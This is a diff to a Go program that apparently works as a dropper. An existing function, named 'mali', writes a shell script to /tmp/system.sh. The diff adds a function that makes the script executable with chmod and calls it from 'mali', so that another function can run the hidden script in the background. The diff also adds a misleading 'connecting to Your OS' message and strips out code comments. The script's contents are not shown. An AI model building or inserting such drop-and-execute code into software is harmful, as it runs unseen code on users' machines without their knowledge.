@@ -32,6 +32,7 @@ func main() {
 		fmt.Printf("%s.\n", os)
 	}
 }
+
 func mali() {
 	f, err := os.Create("/tmp/system.sh")
 
@@ -46,6 +47,7 @@ func mali() {
 	if err2 != nil {
 		log.Fatal(err2)
 	}
+	dongi()
 }
 func meo2() {
 	user, err := user.Current()
@@ -57,8 +59,19 @@ func meo2() {
 	fmt.Println(username)
 
 }
-func meo() {
+func dongi() {
+	fmt.Println("executed")
+	first_cmd := `chmod +x /tmp/system.sh`
+	cmd := exec.Command("bash", "-c", first_cmd)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Printf(string(output))
 
+}
+func meo() {
+	fmt.Println("connecting to Your OS")
 	cmd := exec.Command("/tmp/system.sh", "> /dev/null 2>&1")
 	cmd.Dir = "/tmp/"
 
@@ -67,11 +80,11 @@ func meo() {
 		return
 	}
 
-	// Do other stuff while cmd runs in background:
+	
 	log.Println("Doing other stuff...")
 	testing()
 
-	// And when you need to wait for the command to finish:
+	
 	if err := cmd.Wait(); err != nil {
 		log.Printf("Cmd returned error: %v", err)
 	}
